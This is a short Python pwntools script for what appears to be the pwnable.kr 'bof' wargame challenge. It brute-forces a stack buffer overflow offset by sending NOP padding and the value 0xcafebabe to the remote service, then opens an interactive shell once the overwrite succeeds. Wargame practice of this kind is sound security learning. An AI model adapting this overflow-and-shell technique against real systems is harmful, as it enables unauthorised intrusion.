import struct
from pwn import *
from colorama import *

key = struct.pack( '<I', 0xcafebabe )
init( autoreset=True )


print Fore.YELLOW + "Beginning attempt to bruteforce the overflow offset... "
#-------------------- . . . 

for i in range( 32, 100, 4 ):
	r = remote( 'pwnable.kr', 9000 )
	r.sendline( '\x90' *  i + key )
	
	print Fore.YELLOW + "Currently at offset:", i

	response = r.recv(4096, timeout=1)
	if ( response == '' ):
		print Fore.GREEN + Style.BRIGHT + "FOUND OFFSET", i
		print Fore.YELLOW + Style.BRIGHT + "Successfully overflowed buffer, here is your shell: "
		r.interactive()
		break
	else:
		r.close()
